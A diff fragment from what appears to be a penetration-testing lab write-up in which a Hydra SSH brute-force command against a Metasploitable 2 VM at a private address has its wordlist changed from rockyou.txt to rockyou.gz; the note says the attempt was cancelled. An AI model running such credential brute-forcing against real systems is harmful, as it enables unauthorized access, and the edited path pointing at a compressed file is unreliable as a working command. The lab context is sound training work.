@@ -66,7 +66,7 @@ This allows Hydra to connect to legacy SSH servers like Metasploitable 2
 Attempting RockYou (Too large)
 
 ```bash
-hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.gz ssh://192.168.56.102
 ```
 Failed (Cancelled) due to large size
 
